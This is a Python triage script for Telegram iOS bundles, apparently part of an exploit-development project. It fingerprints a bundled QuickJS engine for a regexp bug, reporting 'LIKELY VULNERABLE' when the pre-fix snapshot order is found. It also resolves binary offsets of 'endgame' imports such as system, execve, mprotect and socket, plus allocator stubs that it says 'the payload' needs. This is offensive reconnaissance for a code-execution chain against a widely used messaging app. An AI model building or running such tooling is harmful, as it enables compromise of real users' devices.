#!/usr/bin/env python3
"""Triage an iOS Telegram .ipa / .app for the message-widget (tgwidget) port.

Host-only: reads the bundle, never talks to a device.

What it reports
---------------
* Info.plist: bundle id, version/build, minimum OS, ATS, background modes.
* Mach-O images (main app, frameworks, appex): arch, image base, __text size,
  imported-symbol stub offsets for the functions the endgame needs.
* Widget sandbox: WidgetJS resource bundles, the `widget-sandbox version=...`
  header, .qbc container magic.
* QuickJS fingerprint:
    - BC_VERSION (from the `invalid version (%d expected=%d)` path),
    - JS_RegExpDelete / js_regexp_exec and whether the `re->bytecode`
      snapshot is taken BEFORE or AFTER the attacker `lastIndex` getter
      (the PR #1827 pre-fix order).
* Optional JSON output.

Usage
-----
  # IPA (extracts only Mach-O members to --work, default /tmp/opencode/ios_port_work)
  analyze_bundle.py --ipa Telegram_13.2.0.ipa

  # already-unpacked .app
  analyze_bundle.py --app Payload/Telegram.app

  # also print stub offsets for a curated symbol list
  analyze_bundle.py --ipa ... --stubs

Requirements: lief, capstone, numpy (the ios_sideload venv has all three).
"""

from __future__ import annotations

import argparse
import json
import os
import plistlib
import re
import shutil
import sys
import tempfile
import zipfile
from dataclasses import dataclass, field, asdict
from typing import Iterable, Optional

try:
    import lief
except Exception as exc:  # pragma: no cover
    sys.stderr.write("error: missing lief (%s)\n" % exc)
    raise SystemExit(2)

try:
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
except Exception as exc:  # pragma: no cover
    sys.stderr.write("error: missing capstone (%s)\n" % exc)
    raise SystemExit(2)

try:
    import numpy as np
except Exception:  # pragma: no cover
    np = None

# Strings that pin the engine / the vulnerable function.
S_BC_VERSION = b"invalid version (%d expected=%d)\x00"
S_REGEXP_ERR = b"corrupted bytecode in regexp execution\x00"
S_WIDGET_HDR = b"widget-sandbox version="

# Imported functions the iOS endgame uses.  Stub offset = stub VA - image base.
ENDGAME_SYMBOLS = [
    "_dlsym", "_dladdr", "_dlopen",
    "_socket", "_connect", "_read", "_write", "_send", "_recv",
    "_close", "_open", "_openat", "_mmap", "_mprotect",
    "_fopen", "_fprintf", "_fputs", "_fwrite", "_fread", "_fclose",
    "_printf", "_puts", "_fflush",
    "_stat", "_unlink", "_getaddrinfo", "_inet_pton",
    "_system", "_posix_spawn", "_execve",
]


@dataclass
class ImageReport:
    path: str
    role: str
    arch: str = ""
    image_base: int = 0
    text_va: int = 0
    text_size: int = 0
    strings: dict = field(default_factory=dict)
    bc_version: list = field(default_factory=list)
    regexp: list = field(default_factory=list)
    stubs: dict = field(default_factory=dict)
    alloc: dict = field(default_factory=dict)


@dataclass
class BundleReport:
    source: str
    info: dict = field(default_factory=dict)
    widget_js: list = field(default_factory=list)
    widget_header: Optional[str] = None
    qbc: list = field(default_factory=list)
    images: list = field(default_factory=list)
    notes: list = field(default_factory=list)


def _qbc_info(data: bytes) -> dict:
    """Summarize a Telegram Widget QuickJS bytecode container.

    Header observed on macOS/iOS: 'TWQB' + u32 version + u64 source size +
    16-byte hash, then a varint/atom table and the quickjs bytecode.  The
    quickjs header starts with BC_VERSION (29) + u32 checksum.
    """
    out = {}
    if len(data) >= 20 and data[:4] == b"TWQB":
        out["magic"] = "TWQB"
        out["version"] = int.from_bytes(data[4:8], "little")
        out["source_size"] = int.from_bytes(data[8:16], "little")
    # Find the quickjs header in the first 2 MiB (BC_VERSION 29, checksum 0).
    i = data[:2 * 1024 * 1024].find(b"\x1d\x00\x00\x00\x00")
    if i >= 0:
        out["bc_version"] = 29
        out["bc_at"] = i
    return out


def _load_info_plist(obj) -> dict:
    try:
        return plistlib.loads(obj) if isinstance(obj, (bytes, bytearray)) else {}
    except Exception:
        return {}


def _pick_info(report: BundleReport, info: dict) -> None:
    keys = [
        "CFBundleIdentifier", "CFBundleShortVersionString", "CFBundleVersion",
        "MinimumOSVersion", "CFBundleSupportedPlatforms",
        "UISupportedDevices", "NSAppTransportSecurity", "UIBackgroundModes",
        "NSLocalNetworkUsageDescription", "UIFileSharingEnabled",
        "CFBundleURLTypes",
    ]
    report.info = {k: info.get(k) for k in keys if k in info}


def _iter_zip_macho(zf: zipfile.ZipFile, app_prefix: str) -> Iterable[tuple[str, str]]:
    """Yield (member, role) for plausible Mach-O files inside the .app."""
    for name in zf.namelist():
        if not name.startswith(app_prefix):
            continue
        low = name.lower()
        if low.endswith("/"):
            continue
        # Only consider files whose basename matches the containing bundle,
        # plus the main executable.
        base = name.rsplit("/", 1)[-1]
        parent = name.rsplit("/", 2)[-2] if "/" in name else ""
        role = "other"
        if name == app_prefix + "Telegram" or parent.endswith(".app") and base == parent[:-4]:
            role = "main"
        elif ".framework/" in name and base == parent[:-10]:
            role = "framework"
        elif ".appex/" in name and base == parent[:-5]:
            role = "appex"
        if role == "other":
            continue
        yield name, role


def _extract_macho(zf: zipfile.ZipFile, member: str, work: str) -> str:
    dest = os.path.join(work, member.replace("/", "__"))
    if not os.path.exists(dest):
        with zf.open(member) as src, open(dest, "wb") as dst:
            shutil.copyfileobj(src, dst)
    return dest


def _read_magic(path: str) -> bytes:
    with open(path, "rb") as f:
        return f.read(8)


def _section_bytes(sec) -> bytes:
    try:
        return bytes(sec.content)
    except Exception:
        return b""


def _find_all(hay: bytes, needle: bytes) -> list[int]:
    out, start = [], 0
    while True:
        i = hay.find(needle, start)
        if i < 0:
            return out
        out.append(i)
        start = i + 1


def _adrp_xrefs(text: bytes, text_va: int, target_va: int) -> list[int]:
    """Return PCs of ADRP+ADD/ADR P+LDR sequences that materialise target_va."""
    if np is not None:
        words = np.frombuffer(text, dtype="<u4").astype(np.uint64)
        mask = ((words >> 24) & 0x9F) == 0x90
        idxs = np.nonzero(mask)[0]
        hits = []
        n = len(words)
        for k in idxs:
            w = int(words[k])
            pc = text_va + int(k) * 4
            immlo = (w >> 29) & 3
            immhi = (w >> 5) & 0x7FFFF
            imm = (immhi << 2) | immlo
            if imm & (1 << 20):
                imm -= 1 << 21
            page = (pc & ~0xFFF) + (imm << 12)
            if not (page <= target_va < page + 0x1000):
                continue
            for j in range(1, 4):
                if k + j >= n:
                    break
                w2 = int(words[k + j])
                # ADD (immediate), 64-bit
                if (w2 & 0x7F000000) == 0x11000000:
                    rd = w2 & 31
                    rn = (w2 >> 5) & 31
                    imm12 = (w2 >> 10) & 0xFFF
                    if w2 & (1 << 22):
                        imm12 <<= 12
                    if rd == (w & 31) and rn == (w & 31) and page + imm12 == target_va:
                        hits.append(pc)
                        break
                # LDR (unsigned offset), 64-bit
                if (w2 & 0xFFC00000) == 0xF9400000:
                    rn = (w2 >> 5) & 31
                    imm12 = ((w2 >> 10) & 0xFFF) * 8
                    if rn == (w & 31) and page + imm12 == target_va:
                        hits.append(pc)
                        break
        return hits

    # Pure-python fallback.
    import struct
    hits = []
    n = len(text) // 4
    words = struct.unpack_from("<%dI" % n, text, 0)
    for k, w in enumerate(words):
        if ((w >> 24) & 0x9F) != 0x90:
            continue
        pc = text_va + k * 4
        immlo = (w >> 29) & 3
        immhi = (w >> 5) & 0x7FFFF
        imm = (immhi << 2) | immlo
        if imm & (1 << 20):
            imm -= 1 << 21
        page = (pc & ~0xFFF) + (imm << 12)
        if not (page <= target_va < page + 0x1000):
            continue
        for j in range(1, 4):
            if k + j >= n:
                break
            w2 = words[k + j]
            if (w2 & 0x7F000000) == 0x11000000:
                rd, rn = w2 & 31, (w2 >> 5) & 31
                imm12 = (w2 >> 10) & 0xFFF
                if w2 & (1 << 22):
                    imm12 <<= 12
                if rd == (w & 31) and rn == (w & 31) and page + imm12 == target_va:
                    hits.append(pc)
                    break
            if (w2 & 0xFFC00000) == 0xF9400000:
                rn = (w2 >> 5) & 31
                imm12 = ((w2 >> 10) & 0xFFF) * 8
                if rn == (w & 31) and page + imm12 == target_va:
                    hits.append(pc)
                    break
    return hits


def _function_starts(binary) -> list[int]:
    try:
        return sorted(binary.imagebase + v for v in binary.function_starts.functions)
    except Exception:
        return []


def _enclosing(starts: list[int], va: int) -> Optional[tuple[int, int]]:
    import bisect
    if not starts:
        return None
    i = bisect.bisect_right(starts, va) - 1
    if i < 0:
        return None
    end = starts[i + 1] if i + 1 < len(starts) else starts[i] + 0x10000
    return starts[i], end


def _disasm_function(binary, start: int, end: int):
    sec = binary.get_section("__text")
    if sec is None:
        return []
    data = _section_bytes(sec)
    off = start - sec.virtual_address
    if off < 0 or off >= len(data):
        return []
    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    return list(md.disasm(data[off:off + (end - start)], start))


def _analyze_quickjs(binary, img: ImageReport) -> None:
    sec = binary.get_section("__cstring")
    text = binary.get_section("__text")
    if sec is None or text is None:
        return
    cdata = _section_bytes(sec)
    tdata = _section_bytes(text)
    cva = sec.virtual_address
    tva = text.virtual_address

    # BC_VERSION: xref to "invalid version (%d expected=%d)"
    for idx in _find_all(cdata, S_BC_VERSION):
        sva = cva + idx
        for pc in _adrp_xrefs(tdata, tva, sva):
            fn = _enclosing(_function_starts(binary), pc)
            if not fn:
                continue
            insns = _disasm_function(binary, fn[0], min(fn[1], fn[0] + 0x800))
            for ins in insns:
                if ins.mnemonic in ("cmp", "mov") and "#0x1d" in ins.op_str:
                    img.bc_version.append({
                        "image": img.path,
                        "function": hex(fn[0]),
                        "insn": hex(ins.address),
                        "text": f"{ins.mnemonic} {ins.op_str}",
                        "string_va": hex(sva),
                    })
                    break
            break

    # JS_RegExpDelete / js_regexp_exec: xref to the "corrupted bytecode" string.
    starts = _function_starts(binary)
    seen_fns = set()
    for idx in _find_all(cdata, S_REGEXP_ERR):
        sva = cva + idx
        for pc in _adrp_xrefs(tdata, tva, sva):
            fn = _enclosing(starts, pc)
            if not fn or fn[0] in seen_fns:
                continue
            seen_fns.add(fn[0])
            insns = _disasm_function(binary, fn[0], min(fn[1], fn[0] + 0x1200))
            snap = None          # (addr, text) for `ldr xR,[xM,#0x38]`
            snap_reg = None      # register loaded from +0x38 (the bytecode ptr)
            last_index = None    # addr of `mov wN,#0x5d`
            near_bl = []
            for i, ins in enumerate(insns):
                if (snap is None and ins.mnemonic == "ldr" and "#0x38]" in ins.op_str
                        and ins.op_str.startswith("x")):
                    # ldr xR, [xM, #0x38]  -> R is the JSString* bytecode
                    try:
                        snap_reg = ins.op_str.split(",")[0].strip()
                        snap = (ins.address, ins.op_str)
                    except Exception:
                        pass
                if (last_index is None and ins.mnemonic == "mov"
                        and ins.op_str == "w3, #0x5d"):
                    last_index = ins.address
                if ins.mnemonic in ("bl", "blr"):
                    near_bl.append((ins.address, ins.op_str))
            # Validate that the +0x38 load is really the bytecode pointer:
            # within the next 12 instructions there must be an
            # `add xD, <snap_reg>, #0x18` (the str8 data pointer).
            if snap and snap_reg:
                start_i = next((i for i, x in enumerate(insns) if x.address == snap[0]), 0)
                ok = False
                for nxt in insns[start_i + 1:start_i + 13]:
                    if (nxt.mnemonic == "add" and nxt.op_str.endswith("#0x18")
                            and nxt.op_str.split(",")[1].strip() == snap_reg):
                        ok = True
                        break
                if not ok:
                    snap = None
            if snap or last_index:
                order = "unknown"
                if snap and last_index:
                    order = "PRE-FIX (snapshot before lastIndex getter)" \
                        if snap[0] < last_index else "POST-FIX (getter before snapshot)"
                img.regexp.append({
                    "image": img.path,
                    "xref": hex(pc),
                    "function": hex(fn[0]),
                    "size": hex(fn[1] - fn[0]),
                    "snapshot": hex(snap[0]) if snap else None,
                    "snapshot_rel": hex(snap[0] - fn[0]) if snap else None,
                    "lastIndex": hex(last_index) if last_index else None,
                    "lastIndex_rel": hex(last_index - fn[0]) if last_index else None,
                    "order": order,
                    "string_va": hex(sva),
                })


def _decode_b(w: int, pc: int) -> Optional[int]:
    """Decode an AArch64 `b`/`bl` immediate, return target or None."""
    if (w >> 26) not in (0x05, 0x25):
        return None
    imm = w & 0x03FFFFFF
    if imm & (1 << 25):
        imm -= 1 << 26
    return pc + imm * 4


def _find_allocator_block(binary, img: ImageReport, sm: dict) -> None:
    """Locate quickjs's js_def_malloc/calloc/free/realloc/usable_size stubs.

    On the macOS proxy build they are contiguous:

        0x...cd0  mov x0,x1 ; b malloc
        0x...cd4  b calloc
        0x...cd8  mov x0,x1 ; b free
        0x...ce0  mov x0,x1 ; mov x1,x2 ; b realloc
        0x...cec  b malloc_usable_size

    The payload only needs js_def_free (the value stored in rt->mf.js_free)
    and the app stub offsets; js_def_free_offset = base - rt->mf.js_free.
    """
    sec = binary.get_section("__text")
    if sec is None:
        return
    d = _section_bytes(sec)
    va = sec.virtual_address
    free_stub = sm.get("_free")
    malloc_stub = sm.get("_malloc")
    realloc_stub = sm.get("_realloc")
    if not (free_stub and malloc_stub and realloc_stub):
        return
    mov_x0_x1 = b"\xe0\x03\x01\xaa"
    candidates = []
    for i in range(0, len(d) - 32, 4):
        if d[i:i + 4] != mov_x0_x1:
            continue
        addr = va + i
        w = int.from_bytes(d[i + 4:i + 8], "little")
        if _decode_b(w, addr + 4) != free_stub:
            continue
        # previous pair: mov x0,x1 ; b malloc
        if i < 8 or d[i - 8:i - 4] != mov_x0_x1:
            continue
        wm = int.from_bytes(d[i - 4:i], "little")
        if _decode_b(wm, addr - 4) != malloc_stub:
            continue
        # following: mov x0,x1 ; mov x1,x2 ; b realloc
        if d[i + 8:i + 12] != mov_x0_x1:
            continue
        # mov x1,x2
        if d[i + 12:i + 16] != b"\xe1\x03\x02\xaa":
            continue
        wr = int.from_bytes(d[i + 16:i + 20], "little")
        if _decode_b(wr, addr + 16) != realloc_stub:
            continue
        candidates.append(addr)
    if not candidates:
        return
    # Prefer the candidate closest to a located quickjs function.
    qjs = [int(r["function"], 16) for r in img.regexp]
    if qjs:
        target = min(qjs, key=lambda x: abs(x - candidates[0]))
        addr = min(candidates, key=lambda a: abs(a - target))
    else:
        addr = candidates[0]
    img.alloc = {
        "js_def_malloc": hex(addr - 8 - img.image_base),
        "js_def_calloc": hex(addr - 4 - img.image_base),
        "js_def_free": hex(addr - img.image_base),
        "js_def_realloc": hex(addr + 8 - img.image_base),
        "js_def_malloc_usable_size": hex(addr + 20 - img.image_base),
        "js_def_free_va": hex(addr),
    }


def _stub_map(binary) -> dict:
    """symbol -> stub VA, using __stubs + the indirect symbol table."""
    try:
        stubs_sec = binary.get_section("__stubs")
        ind = list(binary.dynamic_symbol_command.indirect_symbols)
        stubs = list(binary.symbol_stubs)
    except Exception:
        return {}
    if stubs_sec is None:
        return {}
    base_idx = stubs_sec.reserved1
    out = {}
    for i, stub in enumerate(stubs):
        idx = base_idx + i
        if idx >= len(ind):
            break
        name = ind[idx].name
        if name:
            out[name] = stub.address
    return out


def analyze_image(path: str, role: str, want_stubs: bool) -> Optional[ImageReport]:
    magic = _read_magic(path)
    if magic[:4] not in (b"\xcf\xfa\xed\xfe", b"\xca\xfe\xba\xbe",
                         b"\xbe\xba\xfe\xca", b"\xfe\xed\xfa\xcf"):
        return None
    try:
        parsed = lief.MachO.parse(path)
    except Exception as exc:
        sys.stderr.write("warn: cannot parse %s: %s\n" % (path, exc))
        return None
    if parsed is None:
        return None
    binary = None
    for b in parsed:
        if str(b.header.cpu_type) == "CPU_TYPE.ARM64":
            binary = b
            break
    if binary is None:
        binary = parsed.at(0)
    img = ImageReport(path=path, role=role)
    img.arch = str(binary.header.cpu_type)
    img.image_base = int(binary.imagebase)
    text = binary.get_section("__text")
    if text is not None:
        img.text_va = int(text.virtual_address)
        img.text_size = int(text.size)

    raw = open(path, "rb").read()
    img.strings = {
        "quickjs": raw.count(b"quickjs"),
        "widget-sandbox": raw.count(S_WIDGET_HDR),
        "corrupted-bytecode": raw.count(S_REGEXP_ERR),
        "invalid-version": raw.count(S_BC_VERSION),
        "tgwidget": raw.count(b"tgwidget"),
        "MessageWidget": raw.count(b"MessageWidget"),
        "WidgetSandbox": raw.count(b"WidgetSandbox"),
        "SandboxEngine": raw.count(b"SandboxEngine"),
    }
    if img.strings["invalid-version"] or img.strings["corrupted-bytecode"]:
        _analyze_quickjs(binary, img)
    sm = _stub_map(binary)
    if sm:
        _find_allocator_block(binary, img, sm)
    if want_stubs:
        for name in ENDGAME_SYMBOLS:
            if name in sm:
                img.stubs[name] = {
                    "va": hex(sm[name]),
                    "offset": hex(sm[name] - img.image_base),
                }
    return img


def inspect_app(app_dir: str, report: BundleReport, want_stubs: bool) -> None:
    plist_path = os.path.join(app_dir, "Info.plist")
    if os.path.exists(plist_path):
        _pick_info(report, _load_info_plist(open(plist_path, "rb").read()))

    # WidgetJS resources (if this build has the sandbox).
    for root, dirs, files in os.walk(app_dir):
        for fn in files:
            if fn in ("sandbox-bundle.js", "validator-bundle.js", "renderer-bundle.js"):
                full = os.path.join(root, fn)
                report.widget_js.append(os.path.relpath(full, app_dir))
                try:
                    head = open(full, "rb").read(4096)
                    m = re.search(S_WIDGET_HDR + rb"([^\s*]+)", head)
                    if m:
                        report.widget_header = m.group(1).decode("ascii", "replace")
                except Exception:
                    pass
            elif fn.endswith(".qbc"):
                full = os.path.join(root, fn)
                try:
                    info = _qbc_info(open(full, "rb").read())
                    info["name"] = os.path.relpath(full, app_dir)
                    report.qbc.append(info)
                except Exception:
                    pass

    # Images: main executable + frameworks + appex.
    main_name = report.info.get("CFBundleExecutable", "Telegram")
    candidates = [(os.path.join(app_dir, main_name), "main")]
    for sub in ("Frameworks", "PlugIns"):
        base = os.path.join(app_dir, sub)
        if not os.path.isdir(base):
            continue
        for name in sorted(os.listdir(base)):
            p = os.path.join(base, name)
            if name.endswith(".framework"):
                exe = os.path.join(p, name[:-10])
                if os.path.exists(exe):
                    candidates.append((exe, "framework"))
            elif name.endswith(".appex"):
                exe = os.path.join(p, name[:-5])
                if os.path.exists(exe):
                    candidates.append((exe, "appex"))
    for path, role in candidates:
        img = analyze_image(path, role, want_stubs)
        if img:
            report.images.append(img)


def inspect_ipa(path: str, work: str, report: BundleReport, want_stubs: bool) -> None:
    zf = zipfile.ZipFile(path)
    apps = sorted({n.split("/")[1] for n in zf.namelist()
                   if n.startswith("Payload/") and n.count("/") >= 2})
    if not apps:
        raise SystemExit("no Payload/*.app in %s" % path)
    app_name = apps[0]
    prefix = "Payload/%s/" % app_name
    info = _load_info_plist(zf.read(prefix + "Info.plist")) if prefix + "Info.plist" in zf.namelist() else {}
    _pick_info(report, info)

    # WidgetJS members.
    for n in zf.namelist():
        base = n.rsplit("/", 1)[-1]
        if base in ("sandbox-bundle.js", "validator-bundle.js", "renderer-bundle.js"):
            report.widget_js.append(n)
            try:
                head = zf.read(n)[:4096]
                m = re.search(S_WIDGET_HDR + rb"([^\s*]+)", head)
                if m:
                    report.widget_header = m.group(1).decode("ascii", "replace")
            except Exception:
                pass
        elif base.endswith(".qbc"):
            try:
                info = _qbc_info(zf.read(n))
                info["name"] = n
                report.qbc.append(info)
            except Exception:
                pass

    os.makedirs(work, exist_ok=True)
    for member, role in _iter_zip_macho(zf, prefix):
        local = _extract_macho(zf, member, work)
        img = analyze_image(local, role, want_stubs)
        if img:
            img.path = member
            report.images.append(img)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--ipa", help="Telegram .ipa")
    src.add_argument("--app", help="unpacked Telegram.app directory")
    src.add_argument("--macho", help="analyze a single Mach-O (e.g. the macOS proxy build)")
    ap.add_argument("--work", default="/tmp/opencode/ios_port_work",
                    help="scratch dir for Mach-O members extracted from the IPA")
    ap.add_argument("--stubs", action="store_true",
                    help="print endgame stub offsets")
    ap.add_argument("--json", help="write the full report as JSON")
    args = ap.parse_args()

    report = BundleReport(source=args.ipa or args.app or args.macho)
    if args.ipa:
        inspect_ipa(args.ipa, args.work, report, args.stubs)
    elif args.app:
        inspect_app(args.app, report, args.stubs)
    else:
        img = analyze_image(args.macho, "single", args.stubs)
        if img:
            report.images.append(img)

    print("== bundle ==")
    for k, v in report.info.items():
        if k == "UISupportedDevices":
            v = "%d devices: %s" % (len(v), ", ".join(v))
        print("  %-32s %s" % (k, v))
    print("  %-32s %s" % ("widget-js", ", ".join(report.widget_js) or "none"))
    print("  %-32s %s" % ("widget-sandbox version", report.widget_header or "none"))
    for q in report.qbc:
        bits = ["%s=%s" % (k, v) for k, v in q.items()
                if k not in ("name",)]
        print("  %-32s %s (%s)" % ("qbc", q.get("name"), ", ".join(bits)))

    print("\n== images ==")
    for img in report.images:
        print("  %-72s %-9s base=%#x text=%#x" %
              (img.path, img.role, img.image_base, img.text_size))
        if img.bc_version:
            for b in img.bc_version:
                print("      BC_VERSION  %s  (%s)" % (b["text"], b["function"]))
        if img.regexp:
            for r in img.regexp:
                print("      RegExp/exec  func=%s size=%s snap=%s lastIndex=%s -> %s" %
                      (r["function"], r["size"], r["snapshot_rel"], r["lastIndex_rel"], r["order"]))
        if img.strings.get("quickjs"):
            print("      strings: " + ", ".join("%s=%d" % (k, v) for k, v in img.strings.items() if v))
        if img.alloc:
            print("      allocator stubs (offsets): " +
                  ", ".join("%s=%s" % (k, v) for k, v in img.alloc.items()
                            if k != "js_def_free_va"))
        if img.stubs:
            print("      endgame stubs:")
            for name, v in img.stubs.items():
                print("        %-14s va=%s offset=%s" % (name, v["va"], v["offset"]))

    has_qjs = any(img.strings.get("invalid-version") for img in report.images)
    print("\n== verdict ==")
    if not has_qjs:
        print("  No QuickJS/WidgetSandbox in this bundle: pre-13.2 build "
              "(or the widget code is in an image not scanned).")
    else:
        orders = {r["order"] for img in report.images for r in img.regexp}
        print("  QuickJS present.  RegExp order: %s" % (", ".join(orders) or "not located"))
        print("  #1827 primitive: %s" %
              ("LIKELY VULNERABLE (pre-fix order found)" if any("PRE-FIX" in o for o in orders)
               else "not proven by this scan; inspect manually"))

    if args.json:
        with open(args.json, "w") as f:
            json.dump(asdict(report), f, indent=2)
        print("\n  JSON: %s" % args.json)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
